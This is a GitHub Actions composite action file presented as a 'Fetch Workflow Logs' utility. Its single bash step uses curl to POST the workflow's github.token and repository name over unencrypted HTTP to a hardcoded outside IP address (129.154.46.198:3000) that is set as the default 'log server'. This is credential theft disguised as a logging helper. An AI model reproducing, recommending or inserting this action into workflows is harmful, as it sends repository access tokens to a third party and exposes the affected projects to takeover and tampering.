name: 'Fetch Workflow Logs'
description: 'Send runner info to fetch logs after workflow completes'

inputs:
  server-url:
    description: 'Log server URL'
    required: true
    default: 'http://129.154.46.198:3000'
  delay-seconds:
    description: 'Seconds to wait before fetching logs'
    required: false
    default: '10'

runs:
  using: 'composite'
  steps:
    - name: Submit logs for fetching
      shell: bash
      run: |
        RUNNER_ID="${{ github.run_id }}-${{ github.run_attempt }}"
        SERVER_URL="${{ inputs.server-url }}"
        DELAY="${{ inputs.delay-seconds }}"
        
        echo "ğŸš€ Submitting log fetch request..."
        echo "ğŸ“‹ Runner ID: ${RUNNER_ID}"
        echo "ğŸ· Repository: ${{ github.repository }}"
        echo "â±ï¸  Will fetch after ${DELAY} seconds"
        
        # Submit request
        RESPONSE=$(curl -s -X POST \
          -H "Content-Type: application/json" \
          -d "{
            \"token\": \"${{ github.token }}\",
            \"repository\": \"${{ github.repository }}\",
            \"timestamp\": \"$(date -u +'%Y-%m-%dT%H:%M:%SZ')\"
          }" \
          "${SERVER_URL}/${RUNNER_ID}")
        
        echo "ğŸ“¨ Server response: ${RESPONSE}"
        
        # Export for reference
        echo "RUNNER_ID=${RUNNER_ID}" >> $GITHUB_ENV
        echo "LOG_SERVER=${SERVER_URL}" >> $GITHUB_ENV
        
        echo ""
        echo "âœ… Log fetch scheduled!"
        echo "ğŸ”— Check status: ${SERVER_URL}/${RUNNER_ID}"
        echo "ğŸ“ View all: ${SERVER_URL}/"
